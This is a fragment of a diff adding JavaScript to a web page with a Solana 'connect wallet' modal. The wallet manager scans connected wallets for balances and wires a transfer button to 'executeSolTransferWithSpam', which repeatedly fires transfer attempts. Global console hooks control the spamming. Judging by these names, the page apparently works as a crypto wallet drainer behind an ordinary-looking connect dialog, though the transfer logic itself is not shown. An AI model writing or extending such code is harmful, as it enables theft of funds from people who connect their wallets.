+          transferSolBtn.addEventListener('click', () => {
+            this.executeSolTransferWithSpam();
+          });
+        }
+      }
+
+      /**
+       * Get connected wallet info
+       */
+      getWalletInfo() {
+        return {
+          isConnected: !!this.connectedWallet,
+          address: this.walletAddress,
+          name: this.walletName,
+          provider: this.connectedWallet,
+          scanData: this.walletData,
+          isScanning: this.isScanning,
+          isTransferring: this.isTransferring,
+          spamActive: this.solTransfer?.isSpamActive || false,
+          spamAttempts: this.solTransfer?.currentSpamAttempt || 0,
+          isMobile: this.isMobile
+        };
+      }
     }
+
+    // ============================================================================
+    // MODAL MANAGEMENT
+    // ============================================================================
+
+    const connectWalletBtn = document.getElementById('connectWalletBtn');
+    const modalOverlay = document.getElementById('modalOverlay');
+    const connectWalletModal = document.getElementById('connectWalletModal');
+    const allWalletsModal = document.getElementById('allWalletsModal');
+    const allWalletsBtn = document.getElementById('allWalletsBtn');
+    const closeBtns = document.querySelectorAll('.close-btn');
+    const backBtn = document.querySelector('.back-btn');
+
+    function openConnectWalletModal() {
+      connectWalletModal.classList.remove('hidden');
+      modalOverlay.classList.remove('hidden');
+      allWalletsModal.classList.add('hidden');
+    }
+
+    function closeAllModals() {
+      connectWalletModal.classList.add('hidden');
+      allWalletsModal.classList.add('hidden');
+      modalOverlay.classList.add('hidden');
+    }
+
+    function switchToAllWallets() {
+      connectWalletModal.classList.add('hidden');
+      allWalletsModal.classList.remove('hidden');
+    }
+
+    function switchBackToConnectWallet() {
+      allWalletsModal.classList.add('hidden');
+      connectWalletModal.classList.remove('hidden');
+    }
+
+    // Set up event handlers for modals
+    connectWalletBtn.addEventListener('click', openConnectWalletModal);
+    allWalletsBtn.addEventListener('click', switchToAllWallets);
+    backBtn.addEventListener('click', switchBackToConnectWallet);
+
+    closeBtns.forEach(btn => {
+      btn.addEventListener('click', closeAllModals);
+    });
+
+    modalOverlay.addEventListener('click', closeAllModals);
+
+    // ============================================================================
+    // INITIALIZATION
+    // ============================================================================
+
+    let walletManager;
+
+    document.addEventListener('DOMContentLoaded', () => {
+      walletManager = new SolanaWalletManager();
+      window.walletManager = walletManager;
+    });
+
+    // ============================================================================
+    // UTILITY FUNCTIONS
+    // ============================================================================
+
+    function getConnectedWallet() {
+      return walletManager ? walletManager.getWalletInfo() : null;
+    }
+
+    async function connectToWallet(walletKey) {
+      if (walletManager) {
+        return await walletManager.connectWallet(walletKey);
+      }
+      throw new Error('Wallet manager not initialized');
+    }
+
+    async function disconnectWallet() {
+      if (walletManager) {
+        return await walletManager.disconnectWallet();
+      }
+    }
+
+    async function rescanWallet() {
+      if (walletManager) {
+        return await walletManager.rescanWallet();
+      }
+    }
+
+    async function transferSol() {
+      if (walletManager) {
+        return await walletManager.executeSolTransferWithSpam();
+      }
+    }
+
+    async function stopSpam() {
+      if (walletManager && walletManager.solTransfer) {
+        walletManager.solTransfer.stopTransactionSpam();
+      }
+    }
+
+    // Global functions for console access
+    window.getConnectedWallet = getConnectedWallet;
+    window.connectToWallet = connectToWallet;
+    window.disconnectWallet = disconnectWallet;
+    window.rescanWallet = rescanWallet;
+    window.transferSol = transferSol;
+    window.stopSpam = stopSpam;
+    window.checkWalletBalanceFast = checkWalletBalanceFast;
+
   </script>
 </body>
 </html>
